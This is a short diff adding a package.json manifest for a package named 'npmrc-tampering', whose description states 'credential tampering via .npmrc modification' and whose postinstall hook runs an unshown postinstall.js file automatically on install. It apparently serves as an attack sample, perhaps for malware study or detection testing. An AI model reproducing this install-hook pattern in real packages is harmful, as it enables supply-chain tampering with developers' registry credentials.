@@ -1,0 +1,8 @@
+{
+  "name": "npmrc-tampering",
+  "version": "3.1.0",
+  "description": "Credential tampering via .npmrc modification",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  }
+}
